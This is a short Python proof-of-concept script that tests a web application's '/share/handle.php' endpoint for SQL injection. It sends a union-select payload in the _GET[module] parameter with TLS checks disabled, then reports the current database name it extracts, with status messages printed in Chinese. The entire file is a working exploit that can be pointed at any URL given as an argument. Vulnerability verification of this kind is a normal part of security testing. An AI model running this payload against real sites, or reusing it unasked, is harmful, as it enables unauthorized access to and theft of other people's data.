#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import requests
import urllib3
import sys
import time
import json
import re
from datetime import datetime, timedelta

urllib3.disable_warnings()

def verify(site):
    patt  = "share_id=([^\"]+)"
    burp0_url = site + "/share/handle.php?_GET[module]=1'+and+1={`='`+1}+and+1=0+union+select+(select/**/database())--+'"
    burp0_headers = {"User-Agent": "Moziilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) ", "Connection": "close", "Accept-Encoding": "gzip"}
    r = requests.get(burp0_url, headers=burp0_headers, verify=False)
    if "short_url" in r.text:
        return re.findall(patt, r.text)[0]
    return ""
    
if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，查询当前数据库的名称为：", info)
    else:
        print("[-]漏洞不存在")
